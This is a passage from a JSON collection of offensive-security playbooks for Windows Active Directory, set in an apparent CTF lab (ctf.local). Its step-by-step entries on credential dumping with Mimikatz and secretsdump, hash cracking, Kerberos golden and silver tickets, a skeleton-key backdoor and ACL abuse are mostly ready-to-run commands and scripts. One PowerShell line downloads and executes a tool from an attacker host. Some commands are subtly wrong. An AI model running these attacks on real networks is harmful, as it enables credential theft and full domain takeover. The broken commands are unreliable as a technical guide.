Compromised service accounts enable domain-wide access\n- **Data Exfiltration**: Services can be modified to exfiltrate sensitive data\n- **Ransomware Deployment**: SYSTEM privileges allow encryption of entire system\n\nCOMMON PITFALLS:\n- **Service Dependencies**: Stopping services may crash dependent services\n- **System Instability**: Modifying critical services can cause system crashes\n- **Detection**: Service modifications often logged in event logs\n- **Rollback Issues**: Failed modifications may leave system in unstable state\n- **Permission Checks**: Some services require specific permissions to modify\n- **64-bit vs 32-bit**: DLL hijacking differs between architectures\n\nTOOLS REFERENCE:\n- **winPEAS**: https://github.com/carlospolop/PEASS-ng (Privilege escalation enumeration)\n- **sc.exe**: Windows Service Controller (built-in)\n- **Process Monitor**: https://learn.microsoft.com/en-us/sysinternals/downloads/procmon (DLL monitoring)\n- **PowerShell**: Windows PowerShell for service management\n- **WMIC**: Windows Management Instrumentation Command-line\n\nFURTHER READING:\n- Windows Service Security: https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment\n- Service Exploitation: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation\n- MITRE ATT&CK Service Abuse: https://attack.mitre.org/techniques/T1543/\n- NIST Windows Security: https://csrc.nist.gov/publications/detail/sp/800-123/final\n- SANS Windows Privilege Escalation: https://www.sans.org/cyber-security-courses/windows-privilege-escalation/",
      "tags": [
        "windows",
        "services",
        "privilege-escalation",
        "exploitation",
        "system"
      ],
      "related_tools": [
        "windows-exploit-suggester",
        "unix-privesc-check",
        "linux-exploit-suggester",
        "registry-scanner",
        "linux-smart-enumeration"
      ]
    },
    {
      "id": "credential-harvesting-dumping",
      "title": "Credential harvesting and dumping techniques",
      "content": "OBJECTIVE: Extract and harvest credentials from compromised Windows systems using various tools and techniques including Mimikatz, secretsdump, and LSASS dumping to enable lateral movement and privilege escalation.\n\nACADEMIC BACKGROUND:\nCredential harvesting is critical in Windows environments where NTLM and Kerberos authentication dominate. MITRE ATT&CK T1003 (Credential Dumping) covers these techniques. Understanding Windows credential storage (SAM, LSASS, registry) and extraction methods is essential for penetration testing and red teaming.\n\nSTEP-BY-STEP PROCESS:\n\n1. Understanding Windows Credential Storage:\n```bash\n# Windows stores credentials in multiple locations:\n# - SAM database: Local user hashes (SYSTEM access required)\n# - LSASS process: In-memory credentials for active sessions\n# - Registry: Cached credentials and LSA secrets\n# - Credential Manager: Stored user credentials\n# - AD database (NTDS.dit): Domain user hashes (Domain Admin required)\n\n# Key concepts:\n# - NTLM hashes: One-way hashes of passwords\n# - Kerberos tickets: TGT/TGS tickets for authentication\n# - Plaintext passwords: Sometimes recoverable from memory\n```\n\n2. LSASS Process Dumping with Mimikatz:\n```bash\n# From compromised Windows host (with admin privileges):\n# Download and run Mimikatz\npowershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.50/mimikatz.exe')\"\n\n# Run Mimikatz (elevated prompt required):\nmimikatz.exe\n\n# Dump LSASS credentials:\nprivilege::debug\nsekurlsa::logonpasswords\n\n# Extract NTLM hashes:\nsekurlsa::msv\n\n# Extract Kerberos tickets:\nsekurlsa::tickets\n\n# Export to file for offline cracking:\nsekurlsa::minidump lsass.dmp\nsekurlsa::logonpasswords > creds.txt\n```\n\n3. SAM Database Dumping:\n```bash\n# From Windows host (SYSTEM privileges required):\n# Use reg save to extract SAM and SYSTEM hives\nreg save HKLM\\SAM sam.hive\nreg save HKLM\\SYSTEM system.hive\n\n# Extract hashes with secretsdump.py:\npython3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL\n\n# Alternative: Use Mimikatz\nmimikatz.exe\nprivilege::debug\ntoken::elevate\nlsadump::sam\n```\n\n4. NTDS.dit Dumping (Domain Controller):\n```bash\n# From compromised DC (Domain Admin required):\n# Use secretsdump.py for remote dumping\npython3 /usr/share/doc/python3-impacket/examples/secretsdump.py ctf.local/adm_backup:BackupAdmin2024!@192.168.100.10\n\n# Alternative: Volume Shadow Copy for offline extraction\n# Create shadow copy:\nvssadmin create shadow /for=C:\n\n# Copy NTDS.dit from shadow copy:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\temp\\\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\\n\n# Extract with secretsdump:\npython3 secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL\n```\n\n5. Kerberos Ticket Extraction:\n```bash\n# Extract TGT from current session:\nmimikatz.exe\nprivilege::debug\nsekurlsa::tickets /export\n\n# List available tickets:\nkerberos::list\n\n# Export specific ticket:\nkerberos::ptt [ticket]\n\n# Use Rubeus for .NET Kerberos manipulation:\nRubeus.exe dump\nRubeus.exe tgtdeleg\n```\n\n6. Credential Manager Dumping:\n```bash\n# Use Mimikatz to dump stored credentials:\nmimikatz.exe\nprivilege::debug\ntoken::elevate\nvault::list\nvault::cred\n\n# Alternative: cmdkey command\ncmdkey /list\n```\n\n7. Browser Credential Dumping:\n```bash\n# Chrome credentials (requires access to user profile):\n# Use tools like BrowserGather or manual extraction\n\n# Firefox credentials:\n# Access key4.db and logins.json files\n```\n\n8. Automated Credential Harvesting:\n```bash\n# Use winPEAS for automated credential discovery:\nwinPEASx64.exe quiet credentials\n\n# Check for:\n# - SAM/NTDS hashes\n# - LSA secrets\n# - Cached credentials\n# - Unattended install files\n# - Cloud credentials\n\n# Empire post-exploitation framework:\n# Setup C2 server, deploy agent, run credential modules\n```\n\n9. Pass-the-Hash and Pass-the-Ticket:\n```bash\n# Use extracted NTLM hash for PtH:\n# With Mimikatz:\nsekurlsa::pth /user:jsmith /domain:ctf.local /ntlm:[hash] /run:cmd.exe\n\n# With CrackMapExec:\ncrackmapexec smb 192.168.100.20 -u jsmith -H [hash] -x whoami\n\n# Pass-the-Ticket with Mimikatz:\nkerberos::ptt [kirbi file]\n\n# Verify ticket:\nklist\n```\n\n10. Credential Storage and Analysis:\n```bash\n# Store harvested credentials securely:\nmkdir ~/ctf/windows/creds\n# Save hashes, tickets, plaintext creds in organized files\n\n# Analyze for weak passwords:\n# Use hashcat for cracking\nhashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt\n\n# Identify domain admins and service accounts:\n# Cross-reference with BloodHound data\n```\n\nWHAT TO LOOK FOR:\n- **Plaintext Passwords**: Rare but valuable when found in memory\n- **NTLM Hashes**: Most common, can be used for PtH attacks\n- **Kerberos Tickets**: Enable PtT and golden ticket attacks\n- **Domain Admin Hashes**: Critical for full domain compromise\n- **Service Account Credentials**: Enable Kerberoasting and further attacks\n- **Cached Credentials**: May contain older or forgotten passwords\n\nSECURITY IMPLICATIONS:\n- **Full Domain Compromise**: Domain Admin credentials enable total control\n- **Lateral Movement**: Stolen creds allow pivoting to other systems\n- **Data Exfiltration**: Access to file shares and databases\n- **Ransomware Deployment**: SYSTEM access enables encryption\n- **Compliance Violations**: Credential theft violates GDPR, HIPAA, etc.\n\nCOMMON PITFALLS:\n- **Insufficient Privileges**: Need admin/SYSTEM for most dumping techniques\n- **AV Detection**: Mimikatz often flagged by antivirus\n- **Process Crashes**: LSASS dumping can crash systems\n- **Time Sensitivity**: Kerberos tickets have expiration times\n- **Network Detection**: Remote dumping generates network traffic\n- **Legal Issues**: Credential dumping in production is illegal\n\nTOOLS REFERENCE:\n- **Mimikatz**: https://github.com/gentilkiwi/mimikatz (Swiss Army knife for credentials)\n- **secretsdump.py**: Part of Impacket (NTDS/SAM dumping)\n- **Rubeus**: https://github.com/GhostPack/Rubeus (.NET Kerberos toolkit)\n- **winPEAS**: https://github.com/carlospolop/PEASS-ng (Credential enumeration)\n- **CrackMapExec**: https://github.com/Porchetta-Industries/CrackMapExec (PtH/PtT automation)\n\nFURTHER READING:\n- Windows Credential Storage: https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-security\n- MITRE ATT&CK Credential Access: https://attack.mitre.org/tactics/TA0006/\n- AD Security Credential Dumping: https://adsecurity.org/?p=2398\n- Black Hat Windows Attacks: https://www.blackhat.com/presentations/bh-usa-09/MURPHY/BHUSA09-Murphy-WindowsCreds-PAPER.pdf",
      "tags": [
        "windows",
        "credentials",
        "mimikatz",
        "dumping",
        "pth"
      ],
      "related_tools": [
        "workflow_red_purple_team_collaboration",
        "playbook_multi_stage_credential_harvesting",
        "ligolo-ng",
        "mimikatz",
        "windows-exploit-suggester"
      ]
    },
    {
      "id": "password-cracking-brute-force",
      "title": "Password cracking and brute force attacks",
      "content": "OBJECTIVE: Crack harvested password hashes using various techniques including dictionary attacks, brute force, and rainbow tables to obtain plaintext passwords for further exploitation.\n\nACADEMIC BACKGROUND:\nPassword cracking exploits weak passwords and poor hashing practices. Common algorithms include NTLM (MD4), Kerberos (RC4/AES). Hashcat and John the Ripper are industry-standard tools. Understanding cracking techniques is crucial for assessing password policy effectiveness.\n\nSTEP-BY-STEP PROCESS:\n\n1. Understanding Hash Types:\n```bash\n# Common Windows hash formats:\n# NTLM: 32-character hexadecimal (MD4)\n# NetNTLMv2: Challenge-response format\n# Kerberos AS-REP: Encrypted with user's password\n# Kerberos TGS: Service ticket hashes\n\n# Hash examples:\n# NTLM: 8846F7EAEE8FB117AD06BDD830B7586C\n# NetNTLMv2: admin::CTF:1122334455667788:...\n# AS-REP: $krb5asrep$23$user@domain.com:...\n```\n\n2. Dictionary Attacks:\n```bash\n# Use common wordlists:\n# RockYou, weakpass.com, or custom domain-specific lists\n\n# Hashcat dictionary attack:\nhashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt\n\n# John the Ripper dictionary:\njohn --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\n\n# Custom wordlist generation:\n# Include company names, seasons, common patterns\ncewl -w custom.txt -d 3 https://ctf.local\n```\n\n3. Brute Force Attacks:\n```bash\n# Brute force with Hashcat (mask attack):\n# ?l = lowercase, ?u = uppercase, ?d = digit, ?s = special\nhashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?l?d\n\n# Incremental brute force:\nhashcat -m 1000 -a 3 hashes.txt --increment --increment-min 1 --increment-max 8 ?a?a?a?a?a?a?a?a\n\n# John the Ripper brute force:\njohn --mask=?u?l?l?l?l?l?l?d hashes.txt\n```\n\n4. Hybrid Attacks:\n```bash\n# Combine dictionary with brute force:\n# Append/prepend numbers and special chars\nhashcat -m 1000 -a 6 hashes.txt /usr/share/wordlists/rockyou.txt ?d?d\nhashcat -m 1000 -a 7 hashes.txt ?d?d /usr/share/wordlists/rockyou.txt\n\n# Rule-based attacks:\nhashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule\n```\n\n5. Rainbow Tables (for LM/NTLM):\n```bash\n# Generate rainbow table:\nrtgen lm_alpha 1 7 0 2100 8000000 16\n\n# Crack with rainbow table:\nrcracki_mt -f hashes.txt lm_alpha\n\n# Note: Rainbow tables are less effective for modern hashes\n```\n\n6. GPU Acceleration:\n```bash\n# Use GPU for faster cracking:\nhashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -d 1,2\n\n# Monitor GPU usage:\nnvidia-smi\n\n# Optimize for GPU memory:\nhashcat --gpu-temp-disable\n```\n\n7. Kerberos-Specific Cracking:\n```bash\n# AS-REP roasting (no pre-auth required):\npython3 GetNPUsers.py ctf.local/ -usersfile users.txt -format hashcat\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt\n\n# Kerberoasting (service accounts):\npython3 GetUserSPNs.py ctf.local/jsmith:Welcome2024! -outputfile kerb.txt\nhashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt\n```\n\n8. Password Policy Analysis:\n```bash\n# Check domain password policy:\ncrackmapexec ldap 192.168.100.10 -u jsmith -p Welcome2024! --password-not-required\n\n# Analyze password strength:\n# Use tools like pipal for statistical analysis\n# Identify common patterns in cracked passwords\n```\n\n9. Advanced Cracking Techniques:\n```bash\n# Markov chains for pattern-based cracking:\nhashcat -m 1000 -a 3 hashes.txt --markov-hcstat /usr/share/hashcat/markov/best.hcstat --markov-threshold 0\n\n# PRINCE attack (PRobability INfinite Chained Elements):\nhashcat -m 1000 -a 8 hashes.txt --generate-rules-func-min 1 --generate-rules-func-max 4 /usr/share/wordlists/rockyou.txt\n\n# Fingerprint attack (analyze hash characteristics):\n# Use hashid to identify hash types\nhashid '8846F7EAEE8FB117AD06BDD830B7586C'\n```\n\n10. Cracking Workflow and Automation:\n```bash\n# Create cracking script:\ncat > ~/ctf/windows/creds/crack.sh << 'EOF'\n#!/bin/bash\nHASHFILE=$1\nWORDLIST=$2\n\n# Dictionary attack\nhashcat -m 1000 -a 0 \"$HASHFILE\" \"$WORDLIST\" --status --status-timer 30\n\n# If no success, try hybrid\nhashcat -m 1000 -a 6 \"$HASHFILE\" \"$WORDLIST\" ?d?d --status\n\n# Brute force as last resort\nhashcat -m 1000 -a 3 \"$HASHFILE\" ?u?l?l?l?l?l?l?d --increment --status\nEOF\nchmod +x ~/ctf/windows/creds/crack.sh\n\n# Run automated cracking:\n./crack.sh hashes.txt /usr/share/wordlists/rockyou.txt\n```\n\nWHAT TO LOOK FOR:\n- **Weak Passwords**: Common words, keyboard patterns, dates\n- **Password Reuse**: Same passwords across accounts\n- **Pattern-Based Passwords**: CompanyName2024, Season2024\n- **Default Credentials**: admin/admin, root/password\n- **Leaked Passwords**: Check against known breach databases\n- **Policy Violations**: Passwords not meeting complexity requirements\n\nSECURITY IMPLICATIONS:\n- **Account Compromise**: Cracked passwords enable unauthorized access\n- **Privilege Escalation**: Admin password cracking leads to domain control\n- **Lateral Movement**: User credentials enable pivoting between systems\n- **Data Breach**: Access to sensitive files and databases\n- **Compliance Failure**: Weak passwords violate security standards\n\nCOMMON PITFALLS:\n- **GPU Resource Exhaustion**: Monitor temperature and usage\n- **False Positives**: Verify cracked passwords manually\n- **Legal Issues**: Cracking in production environments is illegal\n- **Time Consumption**: Complex passwords may take months to crack\n- **Hash Type Mismatch**: Ensure correct hash mode (-m parameter)\n- **Wordlist Quality**: Poor wordlists yield poor results\n\nTOOLS REFERENCE:\n- **Hashcat**: https://hashcat.net/hashcat/ (GPU-accelerated password cracker)\n- **John the Ripper**: https://www.openwall.com/john/ (Classic password cracker)\n- **GetNPUsers.py**: Impacket tool for AS-REP roasting\n- **GetUserSPNs.py**: Impacket tool for Kerberoasting\n- **hashid**: https://github.com/psypanda/hashid (Hash type identification)\n\nFURTHER READING:\n- Password Cracking Techniques: https://www.netmux.com/blog/password-cracking-techniques\n- Hashcat Documentation: https://hashcat.net/wiki/\n- Kerberos Attacks: https://www.sans.org/cyber-security-skills-roadmap/kerberos-attacks/\n- Password Analysis: https://www.openwall.com/presentations/Passwords12-The-Future-Of-Hashing/",
      "tags": [
        "windows",
        "password-cracking",
        "hashcat",
        "brute-force",
        "kerberos"
      ],
      "related_tools": [
        "ligolo-ng",
        "hashcat",
        "playbook_credential_spraying_brute_force",
        "john",
        "windows-exploit-suggester"
      ]
    },
    {
      "id": "kerberos-attacks",
      "title": "Kerberos attacks and exploitation",
      "content": "OBJECTIVE: Exploit Kerberos authentication weaknesses including AS-REP roasting, Kerberoasting, golden/silver ticket attacks, and Kerberos delegation abuse for credential theft and privilege escalation.\n\nACADEMIC BACKGROUND:\nKerberos is Windows' default authentication protocol using tickets (TGT/TGS) and keys. Vulnerabilities include weak encryption (RC4), delegation misconfigurations, and offline cracking opportunities. MITRE ATT&CK covers Kerberos attacks under T1558 (Steal or Forge Kerberos Tickets).\n\nSTEP-BY-STEP PROCESS:\n\n1. Kerberos Authentication Overview:\n```bash\n# Kerberos components:\n# - KDC (Key Distribution Center): AS and TGS services\n# - TGT (Ticket Granting Ticket): Initial ticket from AS\n# - TGS (Ticket Granting Service): Issues service tickets\n# - SPN (Service Principal Name): Identifies services\n\n# Authentication flow:\n# 1. Client requests TGT from AS\n# 2. AS validates user, issues TGT\n# 3. Client requests service ticket from TGS\n# 4. TGS issues service ticket\n# 5. Client presents ticket to service\n```\n\n2. AS-REP Roasting (No Pre-Authentication):\n```bash\n# Identify vulnerable users (DONT_REQ_PREAUTH):\npython3 GetNPUsers.py ctf.local/ -usersfile users.txt -format hashcat\n\n# Crack the hashes:\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt\n\n# Use cracked credentials:\ncrackmapexec smb 192.168.100.10 -u vulnerable_user -p cracked_password\n\n# Alternative: Manual with Mimikatz\n# Request AS-REP for user:\nmimikatz.exe\nkerberos::ask /user:vulnerable_user /domain:ctf.local /dc:dc01.ctf.local\n```\n\n3. Kerberoasting (Service Account Roasting):\n```bash\n# Enumerate SPNs:\npython3 GetUserSPNs.py ctf.local/jsmith:Welcome2024! -outputfile kerb.txt\n\n# Crack service ticket hashes:\nhashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt\n\n# Alternative: With Rubeus\nRubeus.exe kerberoast /domain:ctf.local /users:svc_sql /creduser:jsmith /credpassword:Welcome2024!\n\n# Use cracked service account password:\n# Attempt lateral movement or privilege escalation\n```\n\n4. Golden Ticket Attacks:\n```bash\n# Extract krbtgt hash (Domain Admin required):\npython3 secretsdump.py ctf.local/adm_backup:BackupAdmin2024!@192.168.100.10 -just-dc-user krbtgt\n\n# Create golden ticket with Mimikatz:\nmimikatz.exe\nkerberos::golden /user:fakeadmin /domain:ctf.local /sid:S-1-5-21-... /krbtgt:krbtgt_hash /ptt\n\n# Verify ticket:\nklist\n\n# Access any service as Domain Admin:\ndir \\\\dc01.ctf.local\\c$\n```\n\n5. Silver Ticket Attacks:\n```bash\n# Extract service account hash:\npython3 secretsdump.py ctf.local/jsmith:Welcome2024!@192.168.100.10 -just-dc-user svc_sql\n\n# Create silver ticket for specific service:\nmimikatz.exe\nkerberos::golden /user:fakeadmin /domain:ctf.local /sid:S-1-5-21-... /target:dc01.ctf.local /service:cifs /rc4:svc_sql_hash /ptt\n\n# Access service without domain admin:\ndir \\\\dc01.ctf.local\\c$\n```\n\n6. Kerberos Delegation Abuse:\n```bash\n# Check for unconstrained delegation:\n# Query AD for computers/users with TRUSTED_FOR_DELEGATION\n\npython3 findDelegation.py ctf.local/jsmith:Welcome2024!\n\n# Exploit unconstrained delegation:\n# If DC has unconstrained delegation, compromise any service\n# Use Rubeus to monitor for delegation\nRubeus.exe monitor /interval:5 /filteruser:target_user\n\n# Constrained delegation exploitation:\n# If user has constrained delegation to service\n# Request ticket for that service\n```\n\n7. Pass-the-Ticket (PtT):\n```bash\n# Extract tickets with Mimikatz:\nmimikatz.exe\nsekurlsa::tickets /export\n\n# Import ticket:\nkerberos::ptt ticket.kirbi\n\n# Verify:\nklist\n\n# Use ticket for access:\n# Access granted services\n\n# With Rubeus:\nRubeus.exe dump\nRubeus.exe ptt /ticket:ticket.kirbi\n```\n\n8. Kerberos Backdoors:\n```bash\n# Skeleton Key (Mimikatz):\n# Patch LSASS to accept master password\nmimikatz.exe\nprivilege::debug\nmisc::skeleton\n\n# Now any password works for domain admin accounts\n\n# DSInternals for offline attacks:\n# Extract and modify AD database offline\n# Create backdoors in user accounts\n```\n\n9. Defensive Measures Testing:\n```bash\n# Test for Kerberos defenses:\n# Check if pre-auth is required\n# Verify ticket encryption (AES vs RC4)\n# Test delegation configurations\n\n# Audit Kerberos events:\n# Event ID 4768: Kerberos TGT request\n# Event ID 4769: Kerberos service ticket request\n# Event ID 4771: Kerberos pre-authentication failed\n```\n\n10. Kerberos Exploitation Workflow:\n```bash\n# Automated Kerberos attack script:\ncat > ~/ctf/windows/tools/kerb_attack.sh << 'EOF'\n#!/bin/bash\nDOMAIN=$1\nUSER=$2\nPASS=$3\nDC=$4\n\n# AS-REP roasting\necho \"[*] AS-REP Roasting...\"\npython3 GetNPUsers.py \"$DOMAIN/\" -usersfile users.txt -format hashcat -outputfile asrep.txt\n\n# Kerberoasting\necho \"[*] Kerberoasting...\"\npython3 GetUserSPNs.py \"$DOMAIN/$USER:$PASS\" -outputfile kerb.txt\n\n# Crack hashes\necho \"[*] Cracking hashes...\"\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --status\nhashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt --status\n\n# Check for delegation\necho \"[*] Checking delegation...\"\npython3 findDelegation.py \"$DOMAIN/$USER:$PASS\"\n\nEOF\nchmod +x ~/ctf/windows/tools/kerb_attack.sh\n\n# Run: ./kerb_attack.sh ctf.local jsmith Welcome2024! 192.168.100.10\n```\n\nWHAT TO LOOK FOR:\n- **AS-REP Roastable Users**: Accounts without Kerberos pre-auth\n- **Kerberoastable SPNs**: Service accounts with weak passwords\n- **Delegation Misconfigurations**: Unconstrained delegation on sensitive accounts\n- **Weak Encryption**: RC4 encryption instead of AES\n- **krbtgt Compromise**: Domain compromise via golden tickets\n- **Service Account Abuse**: Lateral movement via service tickets\n\nSECURITY IMPLICATIONS:\n- **Domain Persistence**: Golden tickets provide indefinite access\n- **Stealthy Lateral Movement**: Silver tickets avoid detection\n- **Privilege Escalation**: Service account compromise\n- **Authentication Bypass**: Skeleton key attacks\n- **Forged Credentials**: Ticket manipulation enables impersonation\n\nCOMMON PITFALLS:\n- **Time Synchronization**: Kerberos requires accurate clocks\n- **Ticket Expiration**: TGTs expire (typically 10 hours)\n- **Encryption Types**: Modern domains use AES256\n- **Pre-auth Requirements**: Most domains require pre-auth now\n- **Delegation Restrictions**: Constrained delegation limits abuse\n- **Audit Logging**: Kerberos events are heavily logged\n\nTOOLS REFERENCE:\n- **Mimikatz**: https://github.com/gentilkiwi/mimikatz (Kerberos manipulation)\n- **Rubeus**: https://github.com/GhostPack/Rubeus (.NET Kerberos toolkit)\n- **Impacket**: https://github.com/fortra/impacket (Kerberos tools)\n- **Hashcat**: https://hashcat.net/hashcat/ (Kerberos hash cracking)\n- **findDelegation.py**: https://github.com/fortra/impacket/blob/master/examples/findDelegation.py\n\nFURTHER READING:\n- Kerberos Security: https://web.mit.edu/kerberos/\n- MITRE ATT&CK Kerberos: https://attack.mitre.org/techniques/T1558/\n- AD Security Kerberos Attacks: https://adsecurity.org/?p=3458\n- SANS Kerberos Pentesting: https://www.sans.org/cyber-security-skills-roadmap/kerberos-attacks/",
      "tags": [
        "windows",
        "kerberos",
        "golden-ticket",
        "as-rep-roasting",
        "delegation"
      ],
      "related_tools": [
        "mimikatz",
        "hashcat",
        "windows-exploit-suggester",
        "bloodhound-python",
        "linux-exploit-suggester"
      ]
    },
    {
      "id": "acl-analysis-privilege-escalation",
      "title": "ACL analysis and Active Directory privilege escalation",
      "content": "OBJECTIVE: Analyze and exploit Access Control List (ACL) misconfigurations in Active Directory to achieve privilege escalation from standard user to Domain Admin through object manipulation and permission abuse.\n\nACADEMIC BACKGROUND:\nACLs in Active Directory control permissions on directory objects. Misconfigurations create attack paths where low-privilege users can modify critical objects. MITRE ATT&CK T1222 (File and Directory Permissions Modification) covers ACL abuse. Understanding AD permission inheritance and object ownership is crucial for effective privilege escalation.\n\nSTEP-BY-STEP PROCESS:\n\n1. Understanding AD ACLs:\n```bash\n# AD objects have ACLs containing Access Control Entries (ACEs)\n# Each ACE has: Trustee (user/group), Permission Type (Allow/Deny), Permissions\n# Common dangerous permissions:\n# GenericAll: Full control over object\n# GenericWrite: Modify object properties\n# WriteDACL: Modify object's ACL\n# WriteOwner: Change object ownership\n# AllExtendedRights: Extended rights (password reset, etc.)\n\n# Inheritance: Child objects inherit parent ACLs unless explicitly blocked\n```\n\n2. ACL Enumeration with Built-in Tools:\n```bash\n# From Windows (with domain access):\n# Use dsacls to check object permissions\ndsacls \"CN=Domain Admins,CN=Users,DC=ctf,DC=local\"\n\n# Check current user permissions on critical objects\nwhoami /groups\n\n# From Linux attacker:\n# Use ldapsearch for ACL enumeration\nldapsearch -x -H ldap://192.168.100.10 -D \"jsmith@ctf.local\" -w Welcome2024! -b \"DC=ctf,DC=local\" \"(objectClass=group)\" member\n```\n\n3. BloodHound ACL Analysis:\n```bash\n# Collect data with SharpHound:\nSharpHound.exe -c ACLs,Container -d ctf.local\n\n# In BloodHound GUI:\n# Look for ACL attack paths:\n# - GenericAll on User objects (password reset)\n# - GenericAll on Group objects (membership modification)\n# - WriteDACL on Domain object (ACL takeover)\n# - GenericWrite on Computer objects (resource-based constrained delegation)\n\n# Common attack paths:\n# User with GenericAll on Domain Admins  Add self to group\n# User with WriteDACL on OU  Grant self full control\n# User with GenericAll on Service Account  Reset password\n```\n\n4. Exploiting GenericAll on User Objects:\n```bash\n# If user has GenericAll on target user:\n# Reset target user's password\nnet user targetuser NewPassword123! /domain\n\n# Or use PowerShell:\nSet-ADAccountPassword -Identity targetuser -Reset -NewPassword (ConvertTo-SecureString \"NewPassword123!\" -AsPlainText -Force)\n\n# Force password change at next logon:\nSet-ADUser -Identity targetuser -ChangePasswordAtLogon $true\n\n# Add target to privileged groups:\nAdd-ADGroupMember -Identity \"Domain Admins\" -Members targetuser\n```\n\n5. Exploiting GenericAll on Group Objects:\n```bash\n# If user has GenericAll on privileged group:\n# Add self to the group\nAdd-ADGroupMember -Identity \"Domain Admins\" -Members currentuser\n\n# Or use net command:\nnet group \"Domain Admins\" currentuser /add /domain\n\n# Verify membership:\nnet user currentuser /domain\nwhoami /groups\n```\n\n6. Exploiting WriteDACL Permissions:\n```bash\n# If user has WriteDACL on object:\n# Grant self GenericAll rights\n# Use dsacls to modify ACLs\ndsacls \"CN=Domain Admins,CN=Users,DC=ctf,DC=local\" /G CTF\\currentuser:GA\n\n# Or use PowerShell with ActiveDirectory module:\n$acl = Get-Acl \"AD:CN=Domain Admins,CN=Users,DC=ctf,DC=local\"\n$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $currentUserSid, \"GenericAll\", \"Allow\"\n$acl.AddAccessRule($ace)\nSet-Acl -Path \"AD:CN=Domain Admins,CN=Users,DC=ctf,DC=local\" -AclObject $acl\n```\n\n7. Exploiting WriteOwner Permissions:\n```bash\n# If user has WriteOwner on object:\n# Take ownership of the object\ndsacls \"CN=Domain Admins,CN=Users,DC=ctf,DC=local\" /takeownership\n\n# Then grant self full permissions\ndsacls \"CN=Domain Admins,CN=Users,DC=ctf,DC=local\" /G CTF\\currentuser:GA\n\n# Use for privilege escalation\n```\n\n8. Exploiting Extended Rights:\n```bash\n# AllExtendedRights allows password reset without knowing current password\n# If user has this on target account:\nSet-ADAccountPassword -Identity targetuser -NewPassword (ConvertTo-SecureString \"NewPass123!\" -AsPlainText -Force) -Reset\n\n# Force change password:\nSet-ADUser -Identity targetuser -ChangePasswordAtLogon $true\n\n# Use new credentials for lateral movement\n```\n\n9. Resource-Based Constrained Delegation:\n```bash\n# If user has GenericWrite on computer object:\n# Configure resource-based constrained delegation\nSet-ADComputer -Identity targetcomputer -PrincipalsAllowedToDelegateToAccount $currentUser\n\n# Request ticket for delegation:\n# Use Rubeus or Kekeo to get delegated ticket\nRubeus.exe s4u /user:targetcomputer$ /rc4:hash /impersonateuser:administrator /msdsspn:cifs/targetcomputer.ctf.local /ptt\n```\n\n10. ACL Attack Path Automation:\n```bash\n# Create automated ACL enumeration script:\ncat > ~/ctf/windows/tools/acl_enum.sh << 'EOF'\n#!/bin/bash\nDOMAIN=$1\nUSER=$2\nPASS=$3\nDC=$4\n\n# Enumerate privileged groups\necho \"[*] Enumerating privileged groups...\"\npython3 GetADGroup.py \"$DOMAIN/$USER:$PASS\" -dc-ip \"$DC\" -all\n\n# Check for ACL misconfigurations\necho \"[*] Checking for dangerous ACLs...\"\n# Use ldapsearch to find objects with suspicious permissions\n\n# BloodHound analysis\necho \"[*] Running BloodHound collection...\"\npython3 bloodhound.py -c ACL -u \"$USER\" -p \"$PASS\" -d \"$DOMAIN\" -dc \"$DC\"\n\nEOF\nchmod +x ~/ctf/windows/tools/acl_enum.sh\n\n# Run: ./acl_enum.sh ctf.local jsmith Welcome2024! 192.168.100.10\n```\n\nWHAT TO LOOK FOR:\n- **GenericAll on User Objects**: Password reset and group membership modification\n- **GenericAll on Group Objects**: Add self to privileged groups\n- **WriteDACL on Critical Objects**: ACL takeover and permission escalation\n- **WriteOwner Permissions**: Object ownership takeover\n- **AllExtendedRights**: Password reset and account manipulation\n- **Resource-Based Delegation**: Computer object takeover\n- **Inheritance Issues**: Child objects inheriting dangerous permissions\n- **Protected Objects**: AdminSDHolder protects privileged accounts\n\nSECURITY IMPLICATIONS:\n- **Domain Compromise**: ACL abuse leads to full domain control\n- **Stealthy Escalation**: ACL changes often go undetected\n- **Persistent Access**: Modified permissions survive reboots\n- **Lateral Movement**: Compromised accounts enable network traversal\n- **Data Exfiltration**: Access to sensitive directory information\n\nCOMMON PITFALLS:\n- **Permission Verification**: Test permissions before exploitation\n- **Audit Logging**: ACL changes trigger security events\n- **Replication Delay**: Changes may take time to replicate\n- **Nested Groups**: Check for indirect group memberships\n- **Protected Objects**: AdminSDHolder protects privileged accounts\n- **Delegation Conflicts**: Existing delegation may block new settings\n\nTOOLS REFERENCE:\n- **BloodHound**: https://github.com/BloodHoundAD/BloodHound (ACL visualization)\n- **SharpHound**: https://github.com/BloodHoundAD/BloodHound (Data collection)\n- **dsacls**: Windows built-in (ACL enumeration)\n- **Set-ADAccountPassword**: PowerShell (Password manipulation)\n- **Rubeus**: https://github.com/GhostPack/Rubeus (Delegation exploitation)\n\nFURTHER READING:\n- AD ACL Attacks: https://adsecurity.org/?p=3658\n- MITRE ATT&CK ACL Abuse: https://attack.mitre.org/techniques/T1222/\n- BloodHound ACL Analysis: https://bloodhound.readthedocs.io/en/latest/\n- Windows Privilege Escalation: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#acl-modification",
      "tags": [
        "windows",
